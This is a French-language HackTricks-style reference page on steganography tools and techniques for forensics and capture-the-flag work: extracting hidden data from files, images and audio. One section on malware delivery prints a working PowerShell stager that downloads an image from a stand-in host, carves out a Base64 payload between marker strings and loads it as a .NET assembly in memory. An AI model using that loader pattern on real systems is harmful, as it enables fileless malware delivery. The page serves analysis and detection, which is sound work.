# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Extraction de données à partir de fichiers**

### **Binwalk**

Un outil pour rechercher dans des fichiers binaires des fichiers intégrés cachés et des données. Il s'installe via `apt` et son code source est disponible sur [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Récupère des fichiers en se basant sur leurs en-têtes et leurs pieds, utile pour les images png. Installé via `apt` et dont le code source est disponible sur [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Aide à visualiser les métadonnées des fichiers, disponible [ici](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Similaire à exiftool, pour la visualisation des métadonnées. Installable via `apt`, source sur [GitHub](https://github.com/Exiv2/exiv2), et dispose d'un [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Identifiez le type de fichier dont il s'agit.

### **Strings**

Extrait des chaînes lisibles de fichiers, en utilisant différents paramètres d'encodage pour filtrer la sortie.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparaison (cmp)**

Utile pour comparer un fichier modifié avec sa version originale trouvée en ligne.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Extraction de données cachées dans le texte**

### **Données cachées dans les espaces**

Les caractères invisibles dans des espaces apparemment vides peuvent dissimuler des informations. Pour extraire ces données, visitez [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Extraction de données à partir d'images**

### **Identifier les détails d'image avec GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) sert à déterminer les types de fichiers image et à identifier une corruption potentielle. Exécutez la commande ci‑dessous pour inspecter une image:
```bash
./magick identify -verbose stego.jpg
```
Pour tenter de réparer une image endommagée, ajouter un commentaire de métadonnées peut aider :
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide pour la dissimulation de données**

Steghide facilite la dissimulation de données dans des fichiers `JPEG, BMP, WAV, and AU`, et permet d'insérer et d'extraire des données chiffrées. L'installation est simple via `apt`, et son [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Commandes:**

- `steghide info file` révèle si un fichier contient des données cachées.
- `steghide extract -sf file [--passphrase password]` extrait les données cachées, mot de passe optionnel.

Pour une extraction via le web, visitez [this website](https://futureboy.us/stegano/decinput.html).

**Attaque par force brute avec Stegcracker:**

- Pour tenter de craquer le mot de passe de Steghide, utilisez [stegcracker](https://github.com/Paradoxis/StegCracker.git) comme suit:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg est spécialisé dans la découverte de données cachées dans les fichiers PNG et BMP. L'installation se fait via `gem install zsteg`, et le projet est disponible sur [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commandes :**

- `zsteg -a file` applique toutes les méthodes de détection sur un fichier.
- `zsteg -E file` spécifie un payload pour l'extraction des données.

### **StegoVeritas and Stegsolve**

**stegoVeritas** vérifie les métadonnées, effectue des transformations d'image et applique du LSB brute forcing, entre autres fonctionnalités. Utilisez `stegoveritas.py -h` pour la liste complète des options et `stegoveritas.py stego.jpg` pour exécuter toutes les vérifications.

**Stegsolve** applique divers filtres de couleur pour révéler des textes ou messages cachés dans les images. Il est disponible sur [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Les techniques de Fast Fourier Transform (FFT) peuvent dévoiler du contenu dissimulé dans les images. Ressources utiles :

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy permet d'insérer des informations dans des fichiers image et audio, en prenant en charge des formats comme PNG, BMP, GIF, WebP et WAV. Il est disponible sur [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Pour analyser des fichiers PNG ou valider leur authenticité, utilisez :
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Outils supplémentaires pour l'analyse d'images**

Pour approfondir, consultez :

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Base64 payloads délimités par marqueurs cachés dans des images (malware delivery)

Les commodity loaders cachent de plus en plus des payloads encodés en Base64 en texte clair à l'intérieur d'images par ailleurs valides (souvent GIF/PNG). Plutôt qu'au niveau des pixels (LSB), le payload est délimité par des chaînes marqueurs uniques de début/fin incorporées dans le texte/la métadonnée du fichier. Un stager PowerShell procède ensuite :

- Télécharge l'image via HTTP(S)
- Localise les chaînes marqueurs (exemples observés : <<sudo_png>> … <<sudo_odt>>)
- Extrait le texte intermédiaire et le décode Base64 en octets
- Charge l'assembly .NET en mémoire et invoque une méthode d'entrée connue (aucun fichier écrit sur le disque)

Extrait PowerShell minimal pour le carving/chargement
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Remarques
- This falls under ATT&CK T1027.003 (steganography). Les chaînes de marquage varient selon les campagnes.
- Hunting: scannez les images téléchargées à la recherche de délimiteurs connus ; signalez `PowerShell` utilisant `DownloadString` suivi de `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extraction de données des fichiers audio**

**Audio steganography** offre une méthode unique pour dissimuler des informations dans des fichiers audio. Différents outils sont utilisés pour intégrer ou extraire du contenu caché.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide est un outil polyvalent conçu pour cacher des données dans des fichiers JPEG, BMP, WAV et AU. Des instructions détaillées sont fournies dans la [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Cet outil est compatible avec divers formats, notamment PNG, BMP, GIF, WebP et WAV. Pour plus d'informations, consultez la [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg est essentiel pour évaluer l'intégrité des fichiers audio, afficher des informations détaillées et identifier d'éventuelles anomalies.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg excelle à dissimuler et à extraire des données dans des fichiers WAV en utilisant la technique least significant bit. Il est disponible sur [GitHub](https://github.com/ragibson/Steganography#WavSteg). Les commandes incluent :
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound permet le chiffrement et la détection d'informations dans des fichiers audio en utilisant AES-256. Il peut être téléchargé depuis [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Outil précieux pour l'inspection visuelle et analytique des fichiers audio, Sonic Visualizer peut révéler des éléments cachés indétectables par d'autres moyens. Visitez le [official website](https://www.sonicvisualiser.org/) pour en savoir plus.

### **DTMF Tones - Dial Tones**

La détection des tonalités DTMF dans des fichiers audio peut être réalisée à l'aide d'outils en ligne tels que [this DTMF detector](https://unframework.github.io/dtmf-detect/) et [DialABC](http://dialabc.com/sound/detect/index.html).

## **Autres techniques**

### **Binary Length SQRT - QR Code**

Des données binaires dont la racine carrée de la longueur est un entier peuvent représenter un QR code. Utilisez ce snippet pour vérifier :
```python
import math
math.sqrt(2500) #50
```
Pour convertir du binaire en image, consultez [dcode](https://www.dcode.fr/binary-image). Pour lire les QR codes, utilisez [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Traduction du Braille**

Pour traduire le Braille, le [Branah Braille Translator](https://www.branah.com/braille-translator) est une excellente ressource.

## **Références**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
